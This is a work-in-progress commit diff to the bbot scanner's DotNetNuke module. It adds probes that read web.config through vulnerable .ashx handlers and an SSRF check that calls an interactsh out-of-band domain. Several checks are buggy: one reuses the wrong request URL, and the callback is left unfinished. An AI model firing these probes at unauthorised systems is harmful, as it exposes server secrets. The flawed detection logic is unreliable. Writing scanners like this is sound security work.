7381486561f1e5362ee4ac1d1e7c61c92b97be1f
liquidsec <paul.mueller08@gmail.com>
2024-01-09 19:06:22 -0500

    in-progress - adding additional checks

--- bbot/modules/dotnetnuke.py
+++ bbot/modules/dotnetnuke.py
@@ -1,4 +1,5 @@
 from bbot.modules.base import BaseModule
+from bbot.core.errors import InteractshError
 
 
 class dotnetnuke(BaseModule):
@@ -19,6 +20,26 @@ class dotnetnuke(BaseModule):
     produced_events = ["VULNERABILITY", "FINDING"]
     flags = ["active", "aggressive", "web-thorough"]
     meta = {"description": "Scan for critical DotNetNuke (DNN) vulnerabilities"}
+
+
+
+
+
+    def interactsh_callback(self, r):
+            
+        self.critical("INTERACTSH_CALLBACK")
+
+        # self.emit_event(
+        #     {
+        #         "severity": matched_severity,
+        #         "host": str(matched_event.host),
+        #         "url": matched_event.data,
+        #         "description": f"Out-of-band interaction: [{matched_technique}] [{r.get('protocol').upper()}] Read Response: {matched_read_response}",
+        #     },
+        #     "VULNERABILITY",
+        #     matched_event,
+        # )
+
 
     async def handle_event(self, event):
         detected = False
@@ -47,7 +68,8 @@ class dotnetnuke(BaseModule):
                     break
 
         if detected == True:
-            for probe_url in [f'{event.data["url"]}/__', f'{event.data["url"]}/']:
+            # DNNPersonalization Deserialization Detection
+            for probe_url in [f'{event.data["url"]}/__', f'{event.data["url"]}/', f'{event.data["url"]}']:
                 result = await self.helpers.request(probe_url, cookies=self.exploit_probe)
                 if result:
                     if "for 16-bit app support" in result.text and "[extensions]" in result.text:
@@ -62,3 +84,81 @@ class dotnetnuke(BaseModule):
                             event,
                         )
                         return
+
+
+            if "endpoint" not in event.tags:
+    
+                # NewsArticlesSlider ImageHandler.ashx File Read
+                result = await self.helpers.request(f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config', cookies=self.exploit_probe)
+                if result:
+                    self.hugewarning(result.text)
+                    if "<configuration>" in result.text:
+                        self.emit_event(
+                            {
+                                "severity": "CRITICAL",
+                                "description": "DotNetNuke dnnUI_NewsArticlesSlider Module Arbitrary File Read",
+                                "host": str(event.host),
+                                "url": f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx',
+                            },
+                            "VULNERABILITY",
+                            event,
+                        )
+                        return
+                # DNNArticle GetCSS.ashx File Read
+                result = await self.helpers.request(f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config', cookies=self.exploit_probe)
+                if result:
+                    self.hugewarning(result.text)
+                    if "<configuration>" in result.text:
+                        self.emit_event(
+                            {
+                                "severity": "CRITICAL",
+                                "description": "DotNetNuke DNNArticle Module GetCSS.ashx Arbitrary File Read",
+                                "host": str(event.host),
+                                "url": f'{event.data["url"]}/Desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config',
+                            },
+                            "VULNERABILITY",
+                            event,
+                        )
+                        return
+
+
+
+
+                # SSRF /DnnImageHandler.ashx
+
+               # TODO:
+                # FIGURE OUT HOW TO MAKE INTERACTSH WORK
+                # ADD LAST DETECTION
+
+                subdomain_tag = self.parent_module.helpers.rand_string(4, digits=False)
+
+                if self.scan.config.get("interactsh_disable", False) == False:
+                    try:
+                        interactsh_instance = self.helpers.interactsh()
+                        interactsh_domain = await interactsh_instance.register(callback=self.interactsh_callback)
+                    except InteractshError as e:
+                        self.warning(f"Interactsh failure: {e}")
+                        return False
+
+                    await self.helpers.request(f'{event.data["url"]}/DnnImageHandler.ashx?mode=file&url=http://{subdomain_tag}.{interactsh_domain}')
+
+                    try:
+                        await interactsh_instance.deregister()
+                        self.debug(
+                            f"successfully deregistered interactsh session with correlation_id {interactsh_instance.correlation_id}"
+                        )
+                    except InteractshError as e:
+                        self.warning(f"Interactsh failure: {e}")
+
+                else:
+                    self.debug(
+                        "Aborting DNNImageHandler SSRF check due to interactsh global disable"
+                    )
+                    return None
+
+
+
+
+
+
+           #      /Install/InstallWizard.aspx?__VIEWSTATE
